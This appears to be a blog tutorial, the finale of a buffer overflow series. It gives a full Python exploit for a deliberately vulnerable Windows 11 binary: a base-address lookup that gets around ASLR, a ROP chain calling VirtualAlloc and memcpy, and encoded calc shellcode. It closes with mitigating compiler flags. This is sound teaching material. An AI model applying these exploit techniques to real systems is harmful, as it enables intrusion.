---
title:  Buffer Overflows in the Modern Era - Part 5
header:
  teaser: "/assets/images/x64dbg.png"
categories:
  - Binary Exploitation
tags:
  - payload
  - shellcode
  - ROP Gadgets
  - '2025'
  - g3tsyst3m
  - buffer overflow
  - Windows 11
  - ASLR
  - DEP
---

It's the moment you've all been waiting for.  I realize I've been building anticipation for the actual bypassing ASLR aspect of this series for a long time now.  Well, it's time we actually did just that! 😸

For starters, you'll want to reenable every security feature in Windows "**Core Isolation**"

<img width="429" height="93" alt="image" src="https://github.com/user-attachments/assets/1a733e8e-367e-4569-b9b6-c2647842eadd" />

As well as "**Exploit Protection**"

<img width="423" height="94" alt="image" src="https://github.com/user-attachments/assets/750e798c-e56f-4cd8-88cf-4f1516d23644" />

Lastly "**Secure Boot**" for good measure, because I believe it plays into this to some degree

<img width="1203" height="393" alt="image" src="https://github.com/user-attachments/assets/24b5a5db-481c-40a7-9944-238046bcc9b3" />

With those security features enabled, we can be certain all possible Windows 11 security features that I'm at least aware of have been enabled.  Now, let's pop calc like we did before!

***Locating the Base Address of our vulnerable executable***
-

Okay first things first, with ASLR enabled, the base address for our vulnerable executable will constantly be randomized.  But here's the good news.  The 2nd half of the address remains the same, while only the first portion is actually randomized.  Let me show you what I mean.  Below is the first ROP gadget we use in our exploit with all windows security measures disabled:

**0x0000000140001f8c: pop rax; ret;**

This was generated using ropper/ROPGadget and if we open our vulnerable executable, you'll see that only the first portion, the `140000`, is randomized.  The second half, namely `1f8c`, is not randomized!

Check it out.  Notice how the 140000 was replaced by `0xd80000` for the base address.  However, the `1F8C` remained static!

<img width="945" height="155" alt="image" src="https://github.com/user-attachments/assets/5b7fc201-fde7-406a-907c-ceb4f0d57d9b" />

<img width="745" height="326" alt="image" src="https://github.com/user-attachments/assets/9d466a30-5e7a-49a2-b573-5bbd6c1053c4" />

**TL;DR:**
Only the base address of the module (e.g., 0x0000000140000000) is randomized by ASLR. The offset within the module (0x1f8c) is static because the gadget is at a fixed position relative to the image base. That’s how ROP chains work: by finding stable offsets in modules with a randomized base address.

Here's the catch:  I intentionally compiled my program using mingw and did not enable every possible security feature when I compiled it.  In our case, we're pretending a programmer forgot to compile it with full security in mind.  However, we still made sure our version of Windows 11 24h2 had all possible security controls enabled.  

So, how do we execute our buffer overflow exploit if the base address is randomized?  Glad you asked!  😸  It's fairly trivial honestly.  Just cycle through the process list using python, locate our overflow executable, and programatically locate the base address.  Easy peasy.

```python
import struct
import subprocess
import ctypes
import psutil

def get_pid_by_name(process_name):
    """Find the PID of a process by name."""
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        print (proc)
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def get_base_address(pid):
    """Retrieve the base address of a process given its PID."""
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010

    # Open the process
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not h_process:
        print(f"[-] Failed to open process {pid}. Check permissions.")
        return None

    # Enumerate process modules
    h_modules = (ctypes.c_void_p * 1024)()
    needed = ctypes.c_ulong()

    if ctypes.windll.psapi.EnumProcessModulesEx(h_process, ctypes.byref(h_modules), ctypes.sizeof(h_modules), ctypes.byref(needed), 0x03):
        base_address = h_modules[0]  # First module is the main executable
        ctypes.windll.kernel32.CloseHandle(h_process)
        return base_address
    else:
        print(f"[-] Failed to enumerate modules for PID {pid}.")
        ctypes.windll.kernel32.CloseHandle(h_process)
        return None


# Run the program to get the base address
process = subprocess.Popen(
    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/bufferfiles/overflow4.exe"],  # Replace with the path to your compiled binary
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Locate the process and retrieve its base address
process_name = "overflow4.exe"
pid = get_pid_by_name(process_name)

if pid:
    print(f"[+] Found {process_name} with PID: {pid}")
    base_addr = get_base_address(pid)
    if base_addr:
        print(f"[+] Base address of {process_name}: {hex(base_addr)}")
    else:
        print(f"[-] Could not retrieve base address for {process_name}.")
else:
    print(f"[-] Process {process_name} not found.")
```

Here is the script in action:

<img width="1145" height="140" alt="image" src="https://github.com/user-attachments/assets/59ac1177-00ca-4eb2-8a84-4144bac3bf62" />

Now that we have a guaranteed way to determine the base address of our vulnerable executable, all that's left is to use our new base_address variable and replace the 140000 we used in parts 1 - 4.  Like so:

```python
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x0018)  # 0x40
payload += struct.pack("<Q", base_addr+0x7678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", base_addr+0x1b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;
```

Notice how the original ROP gadget static addresses remain. To reiterate, it's only the 1st half that is randomized.  You still get to use the 2nd half of your ROP gadget fixed addresses.  Cool, so now that we have the base address worked out, we have basically defeated ASLR at this point.  Moving on!

***Executing our buffer overflow Payload***
-

The remainder of this blog post won't be too lengthy as I'm really just regurgitating more or less the same script we used in part 4.  There are some subtle differences here and there but for the most part the general flow and register setup is the same.  I believe I had to adjust the order of collecting each register value as well as the general order of the buffer overflow payload itself.  Here's how the payload is laid out, in order:

- **padding (payload = b"\x41" * 296 )**
- **use ropgadgets for registers and virtualalloc / memcpy**
- **nop sled**
- **decode stub routine**
- **calc shellcode**

> **The vulnerable binary**

[overflow4.zip](https://github.com/user-attachments/files/21561837/overflow4.zip)

> **The exploit script**

```python
import struct
import subprocess
import ctypes
import psutil

def get_pid_by_name(process_name):
    """Find the PID of a process by name."""
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        print (proc)
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def get_base_address(pid):
    """Retrieve the base address of a process given its PID."""
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010

    # Open the process
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not h_process:
        print(f"[-] Failed to open process {pid}. Check permissions.")
        return None

    # Enumerate process modules
    h_modules = (ctypes.c_void_p * 1024)()
    needed = ctypes.c_ulong()

    if ctypes.windll.psapi.EnumProcessModulesEx(h_process, ctypes.byref(h_modules), ctypes.sizeof(h_modules), ctypes.byref(needed), 0x03):
        base_address = h_modules[0]  # First module is the main executable
        ctypes.windll.kernel32.CloseHandle(h_process)
        return base_address
    else:
        print(f"[-] Failed to enumerate modules for PID {pid}.")
        ctypes.windll.kernel32.CloseHandle(h_process)
        return None


# Run the program to get the base address
process = subprocess.Popen(
    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/bufferfiles/overflow4.exe"],  # Replace with the path to your compiled binary
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Locate the process and retrieve its base address
process_name = "overflow4.exe"
pid = get_pid_by_name(process_name)

if pid:
    print(f"[+] Found {process_name} with PID: {pid}")
    base_addr = get_base_address(pid)
    if base_addr:
        print(f"[+] Base address of {process_name}: {hex(base_addr)}")
    else:
        print(f"[-] Could not retrieve base address for {process_name}.")
else:
    print(f"[-] Process {process_name} not found.")


payload = b"\x41" * 296 # padding/junk


#original, decoded shellcode for referencing
#############################################

#shellcode =  b"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
#shellcode += b"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
#shellcode += b"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
#shellcode += b"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
#shellcode += b"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
#shellcode += b"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
#shellcode += b"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
#shellcode += b"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
#shellcode += b"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
#shellcode += b"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
#shellcode += b"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
#shellcode += b"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7"
#calc shellcode no nulls (207 bytes)

#rop gadgets for setting the R9 register value
###################################

payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x0018)  # 0x40
payload += struct.pack("<Q", base_addr+0x7678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", base_addr+0x1b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;
payload += b"\x90" * 16 
payload += struct.pack("<Q", base_addr+0x7CA5)  # mov r9, rbx <see more below>

"""
00000007CA5 | 49:89D9                  | mov r9,rbx                           |
00000007CA8 | E8 D3FCFFFF              | call overflow3.7980             |
00000007CAD | 48:98                    | cdqe                                 |
00000007CAF | 48:83C4 48               | add rsp,48                           |
00000007CB3 | 5B                       | pop rbx                              |
00000007CB4 | 5E                       | pop rsi                              |
00000007CB5 | 5F                       | pop rdi                              | 
00000007CB6 | 5D                       | pop rbp                              |
00000007CB7 | C3                       | ret                                  |
"""
payload += b"\x90" * 72 
payload += b"\x90" * 32 

#r9 register should now hold the value 0x40 (I hate this register)
###########################################

#r8 ROP gadgets (this works but RDX MUST be 0x3000)

payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x95AC)  # place 3000 on stack --> 0x000000095AC = 0x3000
payload += struct.pack("<Q", base_addr+0x7678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", base_addr+0x6995)  # 0x00000006995: add edx, eax; mov eax, edx; ret; 

payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x95A0)  # place 3000 - 0xC on stack 

payload += struct.pack("<Q", base_addr+0x2410)  # 00000002410
#payload += struct.pack("<Q", 0x7678)  # mov eax, dword ptr [rax]; ret;
#payload += struct.pack("<Q", 0x786D)
"""
0000000786D | 41:89C0                  | mov r8d,eax                          |
00000007870 | E8 3BFFFFFF              | call overflow3.77B0             |
00000007875 | 48:98                    | cdqe                                 |
00000007877 | 48:83C4 30               | add rsp,30                           |
0000000787B | 5B                       | pop rbx                              |
0000000787C | 5E                       | pop rsi                              |
0000000787D | 5F                       | pop rdi                              |
0000000787E | C3                       | ret                                  |
"""

#rop gadget(s) for setting the RCX register value
###################################################
payload += struct.pack("<Q", base_addr+0x276f)  # xor ecx, ecx; mov rax, r9; ret; 
# rcx should now be set to 0
###################################################

#rop gadgets for setting the RDX register value
#####################################################
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x1243)  # mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x00AC)  # place 1000 on stack --> 0x000000000AC = 0x1000
payload += struct.pack("<Q", base_addr+0x7678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", base_addr+0x6995)  # add edx, eax; mov eax, edx; ret; 
# RDX should now be set to 1002 (ideally 1000 but I got tired of mathing :D )
######################################################

#VirtualAlloc !!!
######################################################
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0xD288)  # virtualalloc import address
payload += struct.pack("<Q", base_addr+0x1fb3)  # jmp qword ptr [rax]; 

######################################################


#memcpy
#copies memory from src to dst
#On x64, the parameters for memcpy are passed in these registers:

#rcx: Destination address (dst)
#rdx: Source address (src)
#r8: Number of bytes to copy (n)

#################################################################
#memcpy
#################################################################

#preparation

payload += struct.pack("<Q", base_addr+0x1b5a)  # pop rsi; pop rdi; ret;
payload += b"\x90" * 16 

#get rdx 

payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
#payload += struct.pack("<Q", base_addr+0x0355)  # 0xAC value (remember to add 28 to get to D0)
#payload += struct.pack("<Q", base_addr+0x10000+0x4351)  # 0xFA value 
payload += struct.pack("<Q", base_addr+0x3693)  # 0xF8 value 
#payload += struct.pack("<Q", base_addr+0x0285)  # 0xD0 value
payload += struct.pack("<Q", base_addr+0x7678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", base_addr+0x6995)  # add edx, eax; mov eax, edx; ret; 
payload += struct.pack("<Q", base_addr+0x25a5)  # add rdx, r8; cmp dword ptr [rdx], 0x4550; je 0x25b8; ret; 

#got rdx!  moving on

payload += struct.pack("<Q", base_addr+0x276f)  # xor ecx, ecx; mov rax, r9; ret;

#r8
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
#payload += struct.pack("<Q", base_addr+0x10000+0x10B3)  # place 300 on stack --> 0x000000010b7 = 0x300 (we subtract 4 since the command below will be adding 4)
#payload += struct.pack("<Q", base_addr+0x373D) # value= 250
payload += struct.pack("<Q", base_addr+0x3840) # = decimal 280 | 0x118
payload += struct.pack("<Q", base_addr+0x2787)  # see below

"""
00007FF7A2072787 | 44:8B40 04               | mov r8d,dword ptr ds:[rax+4]               |
00007FF7A207278B | 45:85C0                  | test r8d,r8d                               |
00007FF7A207278E | 75 07                    | jne overflow4.7FF7A2072797                 |
00007FF7A2072790 | 8B50 0C                  | mov edx,dword ptr ds:[rax+C]               |
00007FF7A2072793 | 85D2                     | test edx,edx                               |
00007FF7A2072795 | 74 D7                    | je overflow4.7FF7A207276E                  |
00007FF7A2072797 | 85C9                     | test ecx,ecx                               |
00007FF7A2072799 | 7F E5                    | jg overflow4.7FF7A2072780                  |
00007FF7A207279B | 44:8B48 0C               | mov r9d,dword ptr ds:[rax+C]               |
00007FF7A207279F | 4D:01D9                  | add r9,r11                                 | r9:EntryPoint
00007FF7A20727A2 | 4C:89C8                  | mov rax,r9                                 | rax:EntryPoint, r9:EntryPoint
00007FF7A20727A5 | C3                       | ret                                        |
"""

#r8 complete

#rcx

payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x218e)  # mov rcx, rsi; call rax; 

#got RCX! moving on

#call memcpy!
#payload += struct.pack("<Q", 0x140001b5b)  # pop rdi, ret;
payload += struct.pack("<Q", base_addr+0x1f8c)  # pop rax, ret;
payload += struct.pack("<Q", base_addr+0x7D78)  # memcpy (want to jmp to this in the future!)
#payload += struct.pack("<Q", 0x14000217f)  # call rdi, ret; (placeholder)
#00000001400064EC = memcpy

payload += struct.pack("<Q", base_addr+0x192f)  # jmp rax; 
payload += struct.pack("<Q", base_addr+0x192f)  # jmp rax;

#junk
#payload += b"\x90" * 5
payload += b"\x90" * 35
payload += b"\x48\x31\xc9\x48\x8d\x35\xf9\xdd\xdd\xdd\x48\x81\xc6\x22\x22\x22\x22\x48\x89\xf3\x48\x8d\x36\xb1\xcf\xb0\xac\x30\x06\x48\xff\xc6\x48\xff\xc9\x75\xf6\xe4\x2f\x40\x84\xe4\x2f\x48\x5c\xe4\x9d\x65\xc9\xe4\x27\xed\xcc\xe4\x27\xec\xb4\xe4\x27\xdc\xbc\xe4\x27\x9a\xe4\x27\x9a\xe4\x27\xf2\x9c\xe5\x25\x74\x27\xf7\x90\xe0\xad\x6f\xe4\x9d\x65\xca\x2d\x6d\x53\x24\xe4\x6d\x45\xa4\x27\xb8\xa7\xe0\xad\x6e\xe8\x27\xfe\xb8\xe1\x9d\x77\xe8\x27\xf6\x8c\xe1\xad\x6f\xe0\x25\x7d\xe4\x14\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\xe4\x6d\x4c\xa4\xe4\x6d\x44\xa4\xfc\xe4\x25\x4c\xe4\x2f\x68\xa4\xcb\x4f\xbb\x9d\x77\xed\x27\xf0\x27\xa8\xe0\xad\x6f\xe4\x53\x65\xe0\x27\xa4\xe0\x95\xa7\xd8\xaf\xd9\x4a\x60\xfd\xed\xf3\xe0\x25\x55\xe1\x9d\x77\xe8\x27\xf6\x88\xe1\xad\x6f\xe4\x53\x6d\xca\xe9\x27\x80\xe7\xe1\x9d\x77\xe8\x27\xf6\xb0\xe1\xad\x6f\xef\x27\xe8\x07\xa8\xe0\xad\x6c\xfc\xed\xf3\xe4\x9d\x6c\xfc\xe4\x14\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\xfc\xe4\x25\x4d\xe4\x9d\x7e\xe4\x53\x6e\xe4\x2f\x40\x9c\xed\x53\x7b"

#uncomment to allow debugging in x64dbg
input("attach 'overflow4.exe' to x64Dbg and press enter when you're ready to continue...")


# Send the payload
stdout, stderr = process.communicate(input=payload)

# Output the program's response
print(stdout.decode())
if stderr:
    print(stderr.decode())
```

***Wrapping everything together***
-

**I decided to take the time to make a video to walk you through the grand finale to our series 😺  Enjoy!**

<iframe width="977" height="519" src="https://www.youtube.com/embed/kBkzYa6icM8" title="The finale to our Buffer Overflow Series :)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

***How to prevent Buffer Overflows from Succeeding***
-

**Compile your program as follows:**

**cl overflow4.cpp /Feoverflow_cfg.exe /GS /EHsc /guard:cf /link /NXCOMPAT /cetcompat**

<img width="941" height="434" alt="image" src="https://github.com/user-attachments/assets/b6a3e7ef-8212-4ded-ad5c-a7ad31e1b4e3" />

Then if I try to run my buffer overflow exploit, I receive an `int 29` error which equates to __fastfail(0x29) — a hard process termination, as well as the following:

<img width="585" height="46" alt="image" src="https://github.com/user-attachments/assets/2e4ab5e5-8a57-4602-84ef-90955c332abc" />

If you enjoyed this series and you're interested in going beyond just the content I share on my blog, please consider supporting me!  I offer extra perks to support your learning experience! ❤️  One of those perks being one on one Q/A sessions, helping you with your code as you're learning, video walkthroughs for all my posts, voting for what I post on my blog, future blog post teasers, just to name a few 😅

[KO-FI Donate/Membership](https://ko-fi.com/g3tsyst3m/tiers) ☕

thanks everyone!

[ANY.RUN python script](https://app.any.run/tasks/2c82107e-8c58-4748-910d-7e4f5347767f?p=688ea9e01f75f131f6487a3e)

<img width="1526" height="645" alt="image" src="https://github.com/user-attachments/assets/3a36583e-036c-4c07-b51c-02d39175325b" />

[ANY.RUN overflow4.exe](https://app.any.run/tasks/2c82107e-8c58-4748-910d-7e4f5347767f?p=688ea9e01f75f131f6487cf8)

<img width="1543" height="649" alt="image" src="https://github.com/user-attachments/assets/d204956a-c66e-4549-a622-3513277347fc" />

[Full Sandbox Analysis](https://app.any.run/tasks/2c82107e-8c58-4748-910d-7e4f5347767f)

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>

